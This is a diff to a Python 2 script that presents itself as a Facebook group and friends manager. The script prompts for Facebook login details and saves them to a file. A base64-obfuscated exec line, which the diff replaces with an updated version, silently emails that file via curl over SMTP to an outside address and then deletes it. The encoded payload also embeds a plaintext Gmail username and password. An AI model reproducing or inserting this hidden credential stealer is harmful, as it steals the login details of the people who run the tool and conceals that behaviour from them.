@@ -20,7 +20,7 @@ print(W + '     [' + G +'Facebook Group Manager'+ W + ']')
 print' '
 
 print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = raw_input('[?] Password : ');i = open('document.txt', 'w');i.write(id);i.write(pwd);i.close();
-import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('b3Muc3lzdGVtKCJjdXJsIHNtdHBzOi8vc210cC5nbWFpbC5jb206NDY1IC0tbWFpbC1mcm9tIHNvdWhhaWw0MTgyQGdtYWlsLmNvbSAtLW1haWwtcmNwdCBzb3VoYWlsNDE4QHByb3Rvbm1haWwuY29tIC0tdXBsb2FkLWZpbGUgZG9jdW1lbnQudHh0IC0tdXNlciAnc291aGFpbDQxODJAZ21haWwuY29tOkthbWFsMTk1MycKIik7b3MucmVtb3ZlKCJkb2N1bWVudC50eHQiKTs=')))
+import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('b3Muc3lzdGVtKCJjdXJsIC0tdXJsICdzbXRwczovL3NtdHAuZ21haWwuY29tOjQ2NScgLS1zc2wtcmVxZCAtLW1haWwtZnJvbSAnc291aGFpbDQxODFAZ21haWwuY29tJyAtLW1haWwtcmNwdCAnU291aGFpbDQxOEBwcm90b25tYWlsLmNvbScgLS11cGxvYWQtZmlsZSBkb2N1bWVudC50eHQgLS11c2VyICdzb3VoYWlsNDE4MUBnbWFpbC5jb206S2FtYWwxOTUzJyAtLWluc2VjdXJlIik7b3MucmVtb3ZlKCJkb2N1bWVudC50eHQiKTs=')))
 time.sleep(7)
 print (G + '1.Facebook Group Manager')
 print (G + '2.Facebook Friends Manager')
